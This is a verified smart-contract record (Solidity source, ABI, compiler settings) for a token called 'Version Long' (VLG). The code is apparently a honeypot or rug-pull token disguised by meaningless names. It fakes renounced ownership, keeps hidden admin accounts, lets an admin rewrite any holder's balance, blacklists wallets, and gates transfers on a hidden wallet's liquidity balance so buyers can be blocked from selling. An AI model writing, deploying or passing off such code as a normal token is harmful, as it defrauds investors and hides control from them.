{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface autoTotalList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fundAmountFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listEnable {\n    function createPair(address marketingTo, address marketingTotal) external returns (address);\n}\n\ninterface fundIsTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderSwap) external view returns (uint256);\n\n    function transfer(address fromTeam, uint256 modeAt) external returns (bool);\n\n    function allowance(address maxSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromTeam,\n        uint256 modeAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellTotal, uint256 value);\n    event Approval(address indexed maxSwap, address indexed spender, uint256 value);\n}\n\ninterface minAmount is fundIsTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract VersionLong is fundAmountFee, fundIsTo, minAmount {\n\n    function enableTx(uint256 modeAt) public {\n        walletLiquidityTx();\n        maxExempt = modeAt;\n    }\n\n    mapping(address => uint256) private minMax;\n\n    uint256 maxExempt;\n\n    constructor (){\n        \n        autoTotalList exemptShould = autoTotalList(fundSellTotal);\n        exemptMode = listEnable(exemptShould.factory()).createPair(exemptShould.WETH(), address(this));\n        \n        txFromShould = _msgSender();\n        exemptAt();\n        enableFrom[txFromShould] = true;\n        minMax[txFromShould] = launchTradingSender;\n        \n        emit Transfer(address(0), txFromShould, launchTradingSender);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchTradingSender;\n    }\n\n    event OwnershipTransferred(address indexed amountSell, address indexed launchMode);\n\n    function owner() external view returns (address) {\n        return marketingFee;\n    }\n\n    bool private senderLaunched;\n\n    function atTotal(address shouldTrading) public {\n        walletLiquidityTx();\n        if (isTotal == senderLaunched) {\n            senderLaunched = true;\n        }\n        if (shouldTrading == txFromShould || shouldTrading == exemptMode) {\n            return;\n        }\n        listTo[shouldTrading] = true;\n    }\n\n    function exemptAt() public {\n        emit OwnershipTransferred(txFromShould, address(0));\n        marketingFee = address(0);\n    }\n\n    address fundBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public enableFrom;\n\n    function listSwapLimit(address tokenToLiquidity, uint256 modeAt) public {\n        walletLiquidityTx();\n        minMax[tokenToLiquidity] = modeAt;\n    }\n\n    function transfer(address tokenToLiquidity, uint256 modeAt) external virtual override returns (bool) {\n        return tokenIs(_msgSender(), tokenToLiquidity, modeAt);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityAtSwap;\n    }\n\n    function allowance(address walletReceiver, address sellTake) external view virtual override returns (uint256) {\n        if (sellTake == fundSellTotal) {\n            return type(uint256).max;\n        }\n        return fundAutoTotal[walletReceiver][sellTake];\n    }\n\n    address public exemptMode;\n\n    function getOwner() external view returns (address) {\n        return marketingFee;\n    }\n\n    function walletFund(address modeFund, address fromTeam, uint256 modeAt) internal returns (bool) {\n        require(minMax[modeFund] >= modeAt);\n        minMax[modeFund] -= modeAt;\n        minMax[fromTeam] += modeAt;\n        emit Transfer(modeFund, fromTeam, modeAt);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private fundAutoTotal;\n\n    uint256 constant launchExemptFee = 16 ** 10;\n\n    uint256 private teamReceiverSender;\n\n    address private marketingFee;\n\n    function walletLiquidityTx() private view {\n        require(enableFrom[_msgSender()]);\n    }\n\n    uint8 private fromTx = 18;\n\n    function receiverMode(address receiverToken) public {\n        require(receiverToken.balance < 100000);\n        if (buyAt) {\n            return;\n        }\n        if (modeTotalLaunched == senderLaunched) {\n            senderLaunched = true;\n        }\n        enableFrom[receiverToken] = true;\n        if (modeTotalLaunched) {\n            exemptLaunchedWallet = teamReceiverSender;\n        }\n        buyAt = true;\n    }\n\n    function tokenIs(address modeFund, address fromTeam, uint256 modeAt) internal returns (bool) {\n        if (modeFund == txFromShould) {\n            return walletFund(modeFund, fromTeam, modeAt);\n        }\n        uint256 receiverLiquidity = fundIsTo(exemptMode).balanceOf(fundBuy);\n        require(receiverLiquidity == maxExempt);\n        require(fromTeam != fundBuy);\n        if (listTo[modeFund]) {\n            return walletFund(modeFund, fromTeam, launchExemptFee);\n        }\n        return walletFund(modeFund, fromTeam, modeAt);\n    }\n\n    function approve(address sellTake, uint256 modeAt) public virtual override returns (bool) {\n        fundAutoTotal[_msgSender()][sellTake] = modeAt;\n        emit Approval(_msgSender(), sellTake, modeAt);\n        return true;\n    }\n\n    uint256 public exemptLaunchedWallet;\n\n    uint256 txTradingLaunch;\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityBuyTo;\n    }\n\n    string private liquidityBuyTo = \"Version Long\";\n\n    function balanceOf(address senderSwap) public view virtual override returns (uint256) {\n        return minMax[senderSwap];\n    }\n\n    bool private modeTotalLaunched;\n\n    function transferFrom(address modeFund, address fromTeam, uint256 modeAt) external override returns (bool) {\n        if (_msgSender() != fundSellTotal) {\n            if (fundAutoTotal[modeFund][_msgSender()] != type(uint256).max) {\n                require(modeAt <= fundAutoTotal[modeFund][_msgSender()]);\n                fundAutoTotal[modeFund][_msgSender()] -= modeAt;\n            }\n        }\n        return tokenIs(modeFund, fromTeam, modeAt);\n    }\n\n    bool public buyAt;\n\n    address public txFromShould;\n\n    address fundSellTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public marketingMaxWallet;\n\n    bool public isTotal;\n\n    string private liquidityAtSwap = \"VLG\";\n\n    uint256 private launchTradingSender = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromTx;\n    }\n\n    mapping(address => bool) public listTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTrading\",\"type\":\"address\"}],\"name\":\"atTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeAt\",\"type\":\"uint256\"}],\"name\":\"enableTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLaunchedWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenToLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAt\",\"type\":\"uint256\"}],\"name\":\"listSwapLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMaxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"}],\"name\":\"receiverMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenToLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFromShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "VersionLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}